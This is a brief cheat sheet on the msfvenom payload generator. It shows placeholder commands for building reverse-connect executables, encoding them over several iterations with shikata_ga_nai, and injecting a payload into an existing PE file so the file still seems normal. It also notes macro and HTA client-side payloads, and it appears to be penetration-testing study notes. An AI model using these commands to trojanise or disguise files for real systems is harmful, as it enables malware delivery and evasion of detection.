# MSFVenom

- Payload generation tool



## Generate a Payload

- -p what payload to generate
- -f the format of the payload 

```
msfvenom -p payload/you/want/to/generate lhost=<local IP> lport=<local port> -f exe -o /path/to/output
```

- Can also generate a payload within metasploit
  - select exploit and payload as normal
  - use generate command

```
generate -f exe -e x86/shikata_ga_nai -i 3 -o output
```



## Encoding



- -e flag is used to encode
- -l encoders will return a list of encoders that can be used 
- -i is iteration how many times you want to encode the payload 

```
msfvenom -p payload/you/want -e x86/shikata_ga_nai -i 4
```

## Inject Payload

- -x flag can be used to inject payload into an existing PE file

```
msfvenom -p payload/you want -x /path/to/file/to/inject.exe 
```

- Injected binary should act as normal

## Client Side Attacks

- msfvenom can also be used to create
  -  office macros
  - HTA files 
  - flash files 